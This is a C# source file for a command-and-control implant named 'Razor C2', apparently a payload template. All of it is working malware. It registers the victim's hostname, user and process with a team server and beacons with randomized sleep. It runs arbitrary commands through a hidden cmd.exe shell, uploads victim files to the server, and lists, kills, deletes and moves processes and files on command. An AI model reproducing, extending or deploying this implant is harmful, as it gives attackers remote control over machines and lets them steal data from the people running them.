// PayloadTemplates/ImplantSource.cs
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading; // For Task.Delay -> Thread.Sleep or await Task.Delay
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Runtime.InteropServices; // For DllImport if needed
using System.Reflection; // For Process.GetCurrentProcess().MainModule fallback

// Define necessary interfaces/classes if not in separate files
namespace RazorC2Implant
{
    // --- Data Models ---
    public class ImplantRegistrationInfo
    {
        public string Hostname { get; set; }
        public string Username { get; set; }
        public string ProcessName { get; set; }
        public int ProcessId { get; set; }
    }

    public class CommandTask
    {
        public string CommandId { get; set; }
        public string CommandText { get; set; }
    }

    public class CommandResult
    {
        public string CommandId { get; set; }
        public string Output { get; set; }
        public bool HasError { get; set; }
    }

    // --- Command Pattern ---
    public interface ICommand
    {
        // Making Execute non-async simplifies framework compatibility slightly if desired,
        // but async/await is available in 4.8. Let's keep it async for now.
        Task<CommandResult> Execute(string[] args, string commandId);
        string GetHelp();
    }

    class Program
    {
        // --- Configuration ---
        static string teamServerBaseUrl = "%%TEAM_SERVER_URL%%"; // Placeholder
        static string implantId = null;
        // Use Lazy<HttpClient> for better resource management in older frameworks potentially
        static Lazy<HttpClient> httpClientLazy = new Lazy<HttpClient>(() => CreateHttpClient());
        static HttpClient HttpClientInstance => httpClientLazy.Value; // Access via property
        static Random rng = new Random();
        static int defaultSleepTime = 10;
        static int currentSleepTime = defaultSleepTime;
        static Dictionary<string, ICommand> commands = new Dictionary<string, ICommand>(StringComparer.OrdinalIgnoreCase); // Case-insensitive
                                                                                                                           // Make currentDirectory volatile or use locks if accessed by multiple threads (unlikely here)
        public static string currentDirectory = GetInitialDirectory();

        // Helper to get initial directory safely
        static string GetInitialDirectory()
        {
            try { return Directory.GetCurrentDirectory(); } catch { return "C:\\"; } // Fallback
        }


        // Helper to create HttpClient
        static HttpClient CreateHttpClient()
        {
            var client = new HttpClient();
            // Enable TLS 1.2 which is important for .NET Framework 4.8
            ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
            client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"); // IE11 UA maybe?
            client.Timeout = TimeSpan.FromMinutes(2); // Add a timeout
            return client;
        }

        // --- Main Entry Point ---
        [STAThread] // May be needed depending on WinAPI calls, usually safe to add
        static void Main(string[] args)
        {
            Console.WriteLine("[*] Razor C2 Implant Starting (.NET Framework Target)..."); // Debug output only
            try
            {
                // Use Task.Run().GetAwaiter().GetResult() as a robust way to run async from sync main
                Task.Run(async () => await RunAsync()).GetAwaiter().GetResult();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!!!] Fatal Error during execution: {ex.ToString()}");
                // Avoid crashing immediately in a real implant maybe?
                Thread.Sleep(30000); // Sleep before potentially exiting
            }
            Console.WriteLine("[*] Implant Main exiting (should not happen in normal loop)."); // Debug
        }

        // --- Main Async Logic ---
        static async Task RunAsync()
        {
            Console.WriteLine($"[*] Initial Directory: {currentDirectory}");
            Console.WriteLine($"[*] Targeting Team Server: {teamServerBaseUrl}");

            InitializeCommands();
            await CheckIn(); // Initial check-in

            while (true)
            {
                try // Wrap main loop body in try/catch
                {
                    if (string.IsNullOrEmpty(implantId))
                    {
                        Console.WriteLine("[!] Implant ID lost. Attempting re-registration...");
                        await Task.Delay(CalculateSleep(currentSleepTime / 2, currentSleepTime)); // Fixed variable name
                        if (!await CheckIn()) // Re-checkin
                        {
                            Console.WriteLine("[!] Re-registration failed.");
                            continue; // Skip task check if failed
                        }
                    }

                    CommandTask task = null;
                    try
                    {
                        var taskUrl = $"{teamServerBaseUrl}/api/implant/{implantId}/tasks";
                        HttpClientInstance.DefaultRequestHeaders.Remove("X-Implant-ID");
                        HttpClientInstance.DefaultRequestHeaders.Add("X-Implant-ID", implantId);

                        Console.WriteLine($"[*] Checking for tasks: {taskUrl}"); // Debug
                        var response = await HttpClientInstance.GetAsync(taskUrl);

                        if (response.StatusCode == HttpStatusCode.OK)
                        {
                            var jsonResponse = await response.Content.ReadAsStringAsync();
                            task = JsonConvert.DeserializeObject<CommandTask>(jsonResponse);
                            if (task != null) Console.WriteLine($"[*] Received task: ID={task.CommandId}, Cmd='{task.CommandText}'");
                        }
                        else if (response.StatusCode == HttpStatusCode.NoContent)
                        {
                            Console.WriteLine($"[*] No tasks. Sleeping.");
                        }
                        else if (response.StatusCode == HttpStatusCode.NotFound)
                        {
                            Console.WriteLine($"[!] Implant ID {implantId} not recognized. Clearing ID.");
                            implantId = null; // Force re-checkin
                            continue;
                        }
                        else
                        {
                            Console.WriteLine($"[!] Error checking tasks: {response.StatusCode}");
                            // Consider clearing ID or increasing sleep on repeated errors?
                            await Task.Delay(CalculateSleep(currentSleepTime, currentSleepTime * 2)); // Fixed variable name
                        }
                    }
                    catch (HttpRequestException httpEx)
                    {
                        Console.WriteLine($"[!] Network Exception checking task: {httpEx.Message}");
                        await Task.Delay(CalculateSleep(currentSleepTime, currentSleepTime * 2)); // Fixed variable name
                    }
                    catch (JsonException jsonEx)
                    {
                        Console.WriteLine($"[!] JSON Exception parsing task: {jsonEx.Message}");
                        // Got response, but couldn't parse - likely not a task. Send empty result? Ignore?
                    }
                    catch (Exception ex) // Catch other unexpected errors
                    {
                        Console.WriteLine($"[!] General Exception during task check: {ex.Message}");
                        await Task.Delay(CalculateSleep(currentSleepTime, currentSleepTime * 2)); // Fixed variable name
                    }

                    // Process task if received
                    if (task != null && !string.IsNullOrEmpty(task.CommandId) && !string.IsNullOrEmpty(task.CommandText))
                    {
                        CommandResult result = await ProcessCommand(task);
                        await SendResult(result);
                        await Task.Delay(CalculateSleep(1, 3)); // Short sleep after command
                    }
                    else
                    {
                        // Normal sleep if no task
                        await Task.Delay(CalculateSleep(currentSleepTime / 2, currentSleepTime)); // Fixed variable name
                    }
                } // End main loop try block
                catch (Exception outerEx)
                {
                    Console.WriteLine($"[!!!] Error in main loop: {outerEx.Message}. Sleeping before continuing.");
                    // Avoid immediate tight loop on error
                    await Task.Delay(TimeSpan.FromSeconds(currentSleepTime)); // Fixed variable name
                }
            } // End while(true)
        }

        // --- Initialize Commands ---
        static void InitializeCommands()
        {
            commands.Clear(); // Ensure clean slate
            commands.Add("help", new HelpCommand(commands));
            commands.Add("whoami", new WhoamiCommand());
            commands.Add("id", new WhoamiCommand());
            commands.Add("pwd", new PwdCommand());
            commands.Add("cd", new ChangeDirectoryCommand());
            commands.Add("ls", new ListDirectoryCommand());
            commands.Add("dir", new ListDirectoryCommand());
            commands.Add("cat", new CatCommand());
            commands.Add("type", new CatCommand());
            commands.Add("mkdir", new MkdirCommand());
            commands.Add("rm", new RemoveCommand());
            commands.Add("mv", new MoveCommand());
            commands.Add("cp", new CopyCommand());
            commands.Add("download", new DownloadCommand(teamServerBaseUrl, () => implantId, HttpClientInstance));
            commands.Add("shell", new ShellCommand(() => currentDirectory));
            commands.Add("implant_exit", new ExitCommand());
            commands.Add("sleep", new SleepCommand(() => currentSleepTime, time => currentSleepTime = time)); // Use member variable
            commands.Add("ps", new ProcessListCommand());
            commands.Add("kill", new KillProcessCommand());
            Console.WriteLine($"[*] {commands.Count} commands initialized."); // Debug
        }

        // --- Process Command ---
        static async Task<CommandResult> ProcessCommand(CommandTask task)
        {
            // Create result with ID immediately
            var result = new CommandResult { CommandId = task.CommandId, HasError = true, Output = "Command processing failed." };
            var commandParts = SplitCommand(task.CommandText);
            var commandName = commandParts.FirstOrDefault()?.ToLowerInvariant();

            if (string.IsNullOrEmpty(commandName))
            {
                result.Output = "Empty command received.";
                return result;
            }

            Console.WriteLine($"[*] Processing command: {commandName}"); // Debug

            try
            {
                if (commands.TryGetValue(commandName, out var command))
                {
                    // Execute the command and return its result
                    return await command.Execute(commandParts.Skip(1).ToArray(), task.CommandId);
                }
                else
                {
                    result.Output = $"Unknown command: {commandName}";
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error executing command '{task.CommandText}': {ex.ToString()}");
                result.Output = $"Runtime Error: {ex.Message}";
                // Keep HasError = true
            }
            return result; // Return the error result
        }

        // --- Communication Functions ---
        static async Task<bool> CheckIn() // Return bool for success/failure
        {
            Console.WriteLine("[*] Performing check-in...");
            try
            {
                // Get Process Name Safely
                string processName = "UnknownProcess";
                try
                {
                    // MainModule can fail in some contexts in .NET Framework
                    Process currentProcess = Process.GetCurrentProcess();
                    processName = currentProcess.MainModule != null ? Path.GetFileName(currentProcess.MainModule.FileName) : currentProcess.ProcessName;
                }
                catch { /* Ignore errors getting process name */ }


                var registrationInfo = new ImplantRegistrationInfo
                {
                    Hostname = Environment.MachineName,
                    Username = Environment.UserDomainName + "\\" + Environment.UserName,
                    ProcessName = processName,
                    ProcessId = Process.GetCurrentProcess().Id
                };

                var jsonPayload = JsonConvert.SerializeObject(registrationInfo);
                using (var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json"))
                {
                    // Manage headers per request for clarity, although HttpClient reuses headers
                    var request = new HttpRequestMessage(HttpMethod.Post, $"{teamServerBaseUrl}/api/implant/hello");
                    request.Content = content;
                    if (!string.IsNullOrEmpty(implantId))
                    {
                        request.Headers.TryAddWithoutValidation("X-Implant-ID", implantId);
                    }

                    var response = await HttpClientInstance.SendAsync(request);

                    if (response.IsSuccessStatusCode)
                    {
                        var jsonResponse = await response.Content.ReadAsStringAsync();
                        try
                        {
                            var resultDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(jsonResponse);
                            if (resultDict != null && resultDict.TryGetValue("implantId", out string newId) && !string.IsNullOrEmpty(newId))
                            {
                                implantId = newId; // Assign new/updated ID
                                Console.WriteLine($"[*] Check-in successful. Implant ID: {implantId}");
                                return true; // Success
                            }
                            else { Console.WriteLine("[!] Check-in response missing implantId."); }
                        }
                        catch (JsonException jsonEx) { Console.WriteLine($"[!] Failed to parse check-in response JSON: {jsonEx.Message}"); }
                    }
                    else { Console.WriteLine($"[!] Check-in HTTP request failed: {response.StatusCode}"); }
                }
            }
            catch (HttpRequestException httpEx) { Console.WriteLine($"[!] Network Exception during check-in: {httpEx.Message}"); }
            catch (Exception ex) { Console.WriteLine($"[!] General Exception during check-in: {ex.Message}"); }

            implantId = null; // Clear ID on any failure
            return false; // Failure
        }

        static async Task<bool> SendResult(CommandResult result) // Return bool
        {
            if (string.IsNullOrEmpty(implantId) || result == null)
            {
                Console.WriteLine("[!] Implant ID or result is null. Cannot send result.");
                return false;
            }

            Console.WriteLine($"[*] Sending result for Command ID: {result.CommandId} (Error: {result.HasError})");
            try
            {
                var jsonPayload = JsonConvert.SerializeObject(result);
                using (var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json"))
                {
                    var request = new HttpRequestMessage(HttpMethod.Post, $"{teamServerBaseUrl}/api/implant/{implantId}/results");
                    request.Content = content;
                    request.Headers.TryAddWithoutValidation("X-Implant-ID", implantId); // Always add ID when sending results

                    var response = await HttpClientInstance.SendAsync(request);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("[*] Result sent successfully.");
                        return true;
                    }
                    else
                    {
                        Console.WriteLine($"[!] Failed to send result: {response.StatusCode}");
                    }
                }
            }
            catch (HttpRequestException httpEx)
            {
                Console.WriteLine($"[!] Network Exception sending result: {httpEx.Message}");
            }
            catch (JsonException jsonEx)
            {
                Console.WriteLine($"[!] JSON Exception serializing result: {jsonEx.Message}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] General Exception sending result: {ex.Message}");
            }
            return false;
        }


        // --- Utility Functions ---
        static string[] SplitCommand(string commandLine)
        {
            if (string.IsNullOrWhiteSpace(commandLine)) return new string[0];
            // Basic split, doesn't handle quotes perfectly for arguments with spaces
            // For netfx compatibility, avoid Regex maybe?
            return commandLine.Trim().Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
            // More robust splitting needed for arguments like "cd C:\Program Files\Folder"
            // but keeping it simple for now.
        }

        static TimeSpan CalculateSleep(int minSec, int maxSec)
        {
            // Ensure currentSleepTime is used in calculation for range
            if (minSec <= 0) minSec = 1;
            if (maxSec < minSec) maxSec = minSec; // Ensure max is at least min

            int baseSleep = (minSec + maxSec) / 2;
            int range = maxSec - minSec;
            // Add +/- 20% jitter of the *average* of the provided range
            int jitter = (int)(baseSleep * 0.2);
            int minRange = Math.Max(1, baseSleep - jitter); // Min sleep is 1 sec
            int maxRange = baseSleep + jitter;

            return TimeSpan.FromSeconds(rng.Next(minRange, maxRange + 1));
        }

    } // End Program class

    // --- Command Implementations ---
    // Command implementations remain the same as they are compatible with .NET Framework 4.8
    // Only showing the first one as an example
    public class HelpCommand : ICommand
    {
        private readonly Dictionary<string, ICommand> _commands;

        public HelpCommand(Dictionary<string, ICommand> commands)
        {
            _commands = commands;
        }

        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();
            output.AppendLine();

            int maxSyntaxLength = _commands.Values.Max(c => c.GetHelp().Split('|')[0].Length);
            int padding = maxSyntaxLength + 6;

            output.Append("\n");
            output.Append(" ");
            output.Append("Syntax".PadRight(padding));
            output.AppendLine("Description");
            output.Append(" ");
            output.Append(new string('-', padding > 1 ? padding - 1 : padding));
            output.AppendLine(" -----------");

            foreach (var cmd in _commands.OrderBy(c => c.Key))
            {
                string[] helpParts = cmd.Value.GetHelp().Split('|');
                string syntax = helpParts[0];
                string description = helpParts[1];

                output.Append(" ");
                output.Append(syntax.PadRight(padding));
                output.AppendLine(description);
            }

            result.Output = output.ToString();
            result.HasError = false;
            return result;
        }

        public string GetHelp()
        {
            return "help|Show this help message.";
        }
    }

    public class WhoamiCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            result.Output = $"{Environment.UserDomainName}\\{Environment.UserName}";
            result.HasError = false;
            return result;
        }

        public string GetHelp()
        {
            return "whoami|Display the current user context.";
        }
    }

    public class PwdCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            result.Output = "\n" + Program.currentDirectory;
            result.HasError = false;
            return result;
        }

        public string GetHelp()
        {
            return "pwd|Print the current working directory.";
        }
    }

    public class ChangeDirectoryCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            if (args.Length == 0)
            {
                output.Append(Program.currentDirectory);
                result.Output = output.ToString();
                result.HasError = false;
                return result;
            }

            var targetDir = string.Join(" ", args);
            targetDir = targetDir.Trim('"');

            try
            {
                string newDir = Path.GetFullPath(Path.Combine(Program.currentDirectory, targetDir));

                if (Directory.Exists(newDir))
                {
                    Program.currentDirectory = newDir;
                    output.Append($"\nChanged directory to: {Program.currentDirectory}");
                }
                else
                {
                    output.Append($"\nDirectory not found: {newDir}");
                    result.HasError = true;
                }
            }
            catch (Exception ex)
            {
                output.Append($"\nError changing directory: {ex.Message}");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "cd <directory>|Change the current working directory.";
        }
    }

    public class ListDirectoryCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            var listPath = args.Length > 0
                ? Path.GetFullPath(Path.Combine(Program.currentDirectory, string.Join(" ", args).Trim('"')))
                : Program.currentDirectory;

            try
            {
                if (!Directory.Exists(listPath))
                {
                    output.Append($"\nDirectory not found: {listPath}");
                    result.HasError = true;
                    result.Output = output.ToString();
                    return result;
                }

                output.AppendLine($"\nDirectory listing for: {listPath}");
                output.AppendLine("Type LastWriteTime     Size Name");
                output.AppendLine("---- -------------     ---- ----");

                foreach (var dir in Directory.GetDirectories(listPath))
                {
                    var dirInfo = new DirectoryInfo(dir);
                    output.AppendFormat("d--- {0,-15} {1}\n",
                        dirInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm"),
                        Path.GetFileName(dir));
                }

                foreach (var file in Directory.GetFiles(listPath))
                {
                    var fileInfo = new FileInfo(file);
                    output.AppendFormat("-a-- {0,-15} {1,8} {2}\n",
                        fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm"),
                        fileInfo.Length,
                        Path.GetFileName(file));
                }
            }
            catch (Exception ex)
            {
                output.Append($"Error listing directory: {ex.Message}");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "ls [directory]|List directory contents (optional path).";
        }
    }

    public class CatCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            if (args.Length == 0)
            {
                output.Append("Usage: cat <filename>");
                result.HasError = true;
                result.Output = output.ToString();
                return result;
            }

            var filePath = Path.GetFullPath(Path.Combine(Program.currentDirectory, string.Join(" ", args).Trim('"')));

            try
            {
                if (!File.Exists(filePath))
                {
                    output.Append($"\nFile not found: {filePath}");
                    result.HasError = true;
                }
                else
                {
                    output.Append(File.ReadAllText(filePath));
                }
            }
            catch (Exception ex)
            {
                output.Append($"\nError reading file: {ex.Message}");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "cat <filename>|Display the content of a text file.";
        }
    }

    public class MkdirCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            if (args.Length == 0)
            {
                output.Append("Usage: mkdir <directory>");
                result.HasError = true;
                result.Output = output.ToString();
                return result;
            }

            var dirToCreate = Path.GetFullPath(Path.Combine(Program.currentDirectory, string.Join(" ", args).Trim('"')));

            try
            {
                if (Directory.Exists(dirToCreate))
                {
                    output.Append($"\nDirectory already exists: {dirToCreate}");
                    result.HasError = true;
                }
                else
                {
                    Directory.CreateDirectory(dirToCreate);
                    output.Append($"\nDirectory created: {dirToCreate}");
                    result.HasError = false;
                }
            }
            catch (Exception ex)
            {
                output.Append($"\nError creating directory: {ex.Message}");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "mkdir <directory>|Create a new directory.";
        }
    }

    public class RemoveCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            if (args.Length == 0)
            {
                output.Append("Usage: rm <file_or_directory>");
                result.HasError = true;
                result.Output = output.ToString();
                return result;
            }

            var itemToDelete = Path.GetFullPath(Path.Combine(Program.currentDirectory, string.Join(" ", args).Trim('"')));

            try
            {
                if (File.Exists(itemToDelete))
                {
                    File.Delete(itemToDelete);
                    output.Append($"\nFile deleted: {itemToDelete}");
                }
                else if (Directory.Exists(itemToDelete))
                {
                    if (Directory.EnumerateFileSystemEntries(itemToDelete).Any())
                    {
                        output.Append("\nDirectory is not empty. Use recursive delete option if implemented.");
                        result.HasError = true;
                    }
                    else
                    {
                        Directory.Delete(itemToDelete, false);
                        output.Append($"\nDirectory deleted: {itemToDelete}");
                    }
                }
                else
                {
                    output.Append($"\nFile or directory not found: {itemToDelete}");
                    result.HasError = true;
                }
            }
            catch (Exception ex)
            {
                output.Append($"\nError deleting item: {ex.Message}");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "rm <file_or_directory>|Remove a file or an empty directory.";
        }
    }

    public class MoveCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            if (args.Length < 2)
            {
                output.Append("Usage: mv <source> <destination>");
                result.HasError = true;
                result.Output = output.ToString();
                return result;
            }

            try
            {
                var sourceMv = Path.GetFullPath(Path.Combine(Program.currentDirectory, args[0].Trim('"')));
                var destMv = Path.GetFullPath(Path.Combine(Program.currentDirectory, args[1].Trim('"')));

                if (File.Exists(sourceMv))
                {
                    File.Move(sourceMv, destMv);
                    output.Append($"\nMoved file {sourceMv} to {destMv}");
                }
                else if (Directory.Exists(sourceMv))
                {
                    Directory.Move(sourceMv, destMv);
                    output.Append($"\nMoved directory {sourceMv} to {destMv}");
                }
                else
                {
                    output.Append($"Source not found: {sourceMv}");
                    result.HasError = true;
                }
            }
            catch (Exception ex)
            {
                output.Append($"\nError moving item: {ex.Message}");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "mv <source> <destination>|Move/rename a file or directory.";
        }
    }

    public class CopyCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            if (args.Length < 2)
            {
                output.Append("Usage: cp <source> <destination>");
                result.HasError = true;
                result.Output = output.ToString();
                return result;
            }

            try
            {
                var sourceCp = Path.GetFullPath(Path.Combine(Program.currentDirectory, args[0].Trim('"')));
                var destCp = Path.GetFullPath(Path.Combine(Program.currentDirectory, args[1].Trim('"')));

                if (!File.Exists(sourceCp))
                {
                    output.Append($"\nSource file not found: {sourceCp}");
                    result.HasError = true;
                }
                else
                {
                    File.Copy(sourceCp, destCp, true); // Allow overwrite for simplicity
                    output.Append($"\nCopied file {sourceCp} to {destCp}");
                }
            }
            catch (Exception ex)
            {
                output.Append($"\nError copying file: {ex.Message}");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "cp <source> <destination>|Copy a file.";
        }
    }

    public class DownloadCommand : ICommand
    {
        private readonly string _teamServerBaseUrl;
        private readonly Func<string> _getImplantId;
        private readonly HttpClient _httpClient;

        public DownloadCommand(string teamServerBaseUrl, Func<string> getImplantId, HttpClient httpClient)
        {
            _teamServerBaseUrl = teamServerBaseUrl;
            _getImplantId = getImplantId;
            _httpClient = httpClient;
        }

        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            if (args.Length < 1)
            {
                output.Append("Usage: download <file_path>");
                result.HasError = true;
                result.Output = output.ToString();
                return result;
            }

            try
            {
                var fileToDownload = Path.GetFullPath(Path.Combine(Program.currentDirectory, string.Join(" ", args).Trim('"')));
                var targetFileName = Path.GetFileName(fileToDownload);

                if (!File.Exists(fileToDownload))
                {
                    output.Append($"\nFile not found: {fileToDownload}");
                    result.HasError = true;
                    result.Output = output.ToString();
                    return result;
                }

                byte[] fileBytes = File.ReadAllBytes(fileToDownload);
                string uploadUrl = $"{_teamServerBaseUrl}/api/implant/{_getImplantId()}/uploadfile?filename={Uri.EscapeDataString(targetFileName)}";

                using (var content = new ByteArrayContent(fileBytes))
                {
                    content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                    HttpResponseMessage response = await _httpClient.PostAsync(uploadUrl, content);

                    if (response.IsSuccessStatusCode)
                    {
                        output.Append($"\nSuccessfully uploaded file: {targetFileName}");
                    }
                    else
                    {
                        string errorDetails = await response.Content.ReadAsStringAsync();
                        output.Append($"\nFailed to upload file {targetFileName}. Status: {response.StatusCode}. Details: {errorDetails}");
                        result.HasError = true;
                    }
                }
            }
            catch (Exception ex)
            {
                output.Append($"\nError during file upload: {ex.Message}");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "download <file_path>|Upload a file to the C2 server.";
        }
    }

    public class ShellCommand : ICommand
    {
        private readonly Func<string> _getCurrentDirectory;

        public ShellCommand(Func<string> getCurrentDirectory)
        {
            _getCurrentDirectory = getCurrentDirectory;
        }

        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            if (args.Length == 0)
            {
                output.Append("Usage: shell <command>");
                result.HasError = false; // Not an error, just showing usage
                result.Output = output.ToString();
                return result;
            }

            try
            {
                var shellArgs = string.Join(" ", args);

                // Check if this is likely a GUI application
                bool isLikelyGuiApp = false;
                if (args.Length > 0)
                {
                    string firstArg = args[0].ToLower();
                    isLikelyGuiApp = firstArg.EndsWith(".exe") &&
                                    !firstArg.Contains("cmd") &&
                                    !firstArg.Contains("powershell");
                }

                // Don't wait for GUI apps
                output.Append(RunProcess("cmd.exe", $"/c {shellArgs}", !isLikelyGuiApp));
                result.HasError = false;
            }
            catch (Exception ex)
            {
                output.Append($"\nError executing shell command: {ex.Message}");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "shell <command>|Execute command via system shell.";
        }

        private string RunProcess(string filename, string arguments, bool waitForExit = true)
        {
            Console.WriteLine($"\n[*] Running: {filename} {arguments}");
            Process process = new Process();
            process.StartInfo.FileName = filename;
            process.StartInfo.Arguments = arguments;
            process.StartInfo.WorkingDirectory = _getCurrentDirectory();
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;

            var output = new StringBuilder();
            process.OutputDataReceived += (sender, e) => { if (e.Data != null) output.AppendLine(e.Data); };
            process.ErrorDataReceived += (sender, e) => { if (e.Data != null) output.AppendLine($"ERR: {e.Data}"); };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            // Only wait if specified
            if (waitForExit)
            {
                // Add timeout to prevent indefinite hanging
                bool exited = process.WaitForExit(10000); // 10-second timeout
                if (!exited)
                {
                    output.AppendLine("\nProcess is still running (timeout reached)");
                }
            }
            else
            {
                output.AppendLine("\nProcess started (not waiting for exit)");
            }

            Console.WriteLine($"\n[*] Process handling completed");
            return output.ToString();
        }
    }

    public class ProcessListCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            try
            {
                var processes = Process.GetProcesses();
                output.AppendLine("\nPID\tName\t\tWindow Title");
                output.AppendLine("---\t----\t\t------------");
                foreach (var proc in processes.OrderBy(p => p.Id))
                {
                    string windowTitle = "";
                    try { windowTitle = proc.MainWindowTitle; } catch { }

                    string name = proc.ProcessName;
                    if (name.Length < 8)
                        output.AppendFormat("{0}\t{1}\t\t{2}\n", proc.Id, name, windowTitle);
                    else
                        output.AppendFormat("{0}\t{1}\t{2}\n", proc.Id, name, windowTitle);
                }
                result.HasError = false;
            }
            catch (Exception ex)
            {
                output.Append($"Error listing processes: {ex.Message}");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "ps|List running processes.";
        }
    }

    public class KillProcessCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            if (args.Length == 0)
            {
                output.Append("Usage: kill <pid>");
                result.HasError = true;
                result.Output = output.ToString();
                return result;
            }

            try
            {
                if (!int.TryParse(args[0], out int pid))
                {
                    output.Append($"\nInvalid process ID: {args[0]}");
                    result.HasError = true;
                    result.Output = output.ToString();
                    return result;
                }

                Process process = Process.GetProcessById(pid);
                process.Kill();
                output.Append($"\nProcess with ID {pid} has been terminated.");
                result.HasError = false;
            }
            catch (ArgumentException)
            {
                output.Append($"\nNo process with ID {args[0]} was found.");
                result.HasError = true;
            }
            catch (Exception ex)
            {
                output.Append($"\nError terminating process: {ex.Message}");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "kill <pid>|Terminate a process by its PID.";
        }
    }
    public class ExitCommand : ICommand
    {
        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            result.Output = "\nReceived exit command. Terminating...";
            result.HasError = false;

            // Allow time for the result to be sent before exiting
            await Task.Delay(1500);
            Environment.Exit(0);

            return result; // This will never be reached
        }

        public string GetHelp()
        {
            return "implant_exit|Terminate the implant process.";
        }
    }

    public class SleepCommand : ICommand
    {
        private readonly Func<int> _getCurrentSleepTime;
        private readonly Action<int> _setSleepTime;

        public SleepCommand(Func<int> getCurrentSleepTime, Action<int> setSleepTime)
        {
            _getCurrentSleepTime = getCurrentSleepTime;
            _setSleepTime = setSleepTime;
        }

        public async Task<CommandResult> Execute(string[] args, string commandId)
        {
            var result = new CommandResult { CommandId = commandId };
            var output = new StringBuilder();

            if (args.Length == 0)
            {
                output.Append($"Current sleep time is {_getCurrentSleepTime()} seconds\nUsage: sleep <seconds>");
                result.HasError = false;
            }
            else if (int.TryParse(args[0], out int seconds) && seconds > 0)
            {
                _setSleepTime(seconds);
                output.Append($"\nSleep time set to {seconds} seconds");
                result.HasError = false;
            }
            else
            {
                output.Append("\nInvalid sleep time. Please specify a positive integer.");
                result.HasError = true;
            }

            result.Output = output.ToString();
            return result;
        }

        public string GetHelp()
        {
            return "sleep <seconds>|Set beacon sleep time in seconds.";
        }
    }
}
